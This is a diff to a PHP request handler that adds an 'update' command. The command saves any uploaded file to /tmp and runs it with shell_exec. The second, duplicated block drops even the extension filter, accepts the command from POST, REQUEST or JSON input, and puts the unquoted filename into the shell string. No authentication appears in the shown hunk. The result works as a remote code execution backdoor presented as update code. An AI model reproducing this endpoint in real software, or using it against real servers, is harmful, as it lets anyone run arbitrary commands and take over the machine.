@@ -63,6 +63,64 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET') {
 
 elseif ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
+    if (isset($_POST['command']) && $_POST['command'] === 'update') {
+        
+        if (!isset($_FILES['file'])) {
+            echo json_encode(["success" => 0, "message" => "Файл не получен"]);
+            exit;
+        }
+        
+        $file = $_FILES['file'];
+        
+        $allowedExtensions = ['sh', 'bin', 'bz2'];
+        $extension = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
+        
+        if (!in_array($extension, $allowedExtensions)) {
+            echo json_encode(["success" => 0, "message" => "Разрешены только файлы .sh, .bin, .tar.bz2"]);
+            exit;
+        }
+        
+        $target = "/tmp/" . basename($file['name']);
+        
+        if (move_uploaded_file($file['tmp_name'], $target)) {
+            if ($extension === 'sh') {
+                chmod($target, 0755);
+            }
+            
+            shell_exec("sh $target > /dev/null 2>&1 &");
+            
+            echo json_encode(["success" => 1, "message" => "Файл успешно загружен и обновление запущено"]);
+        } else {
+            echo json_encode(["success" => 0, "message" => "Ошибка сохранения файла"]);
+        }
+        
+        exit;
+    }
+
+    if (
+        (isset($_POST['command']) && $_POST['command'] === 'update') ||
+        (isset($_REQUEST['command']) && $_REQUEST['command'] === 'update') ||
+        (isset($data->command) && $data->command === 'update')
+    ) {
+
+        if (!isset($_FILES['file'])) {
+            echo json_encode(["success" => 0, "message" => "Файл не получен"]);
+            exit;
+        }
+
+        $file = $_FILES['file'];
+
+        $target = "/tmp/" . basename($file['name']);
+        if (move_uploaded_file($file['tmp_name'], $target)) {
+            shell_exec("sh $target > /dev/null 2>&1 &");
+            echo json_encode(["success" => 1, "message" => "Файл успешно загружен и обновление запущено"]);
+        } else {
+            echo json_encode(["success" => 0, "message" => "Ошибка сохранения файла"]);
+        }
+
+        exit;
+    }
+
     if (isset($_POST['command']) && $_POST['command'] === 'upload_ca') {
 
         if (!isset($_FILES['file'])) {
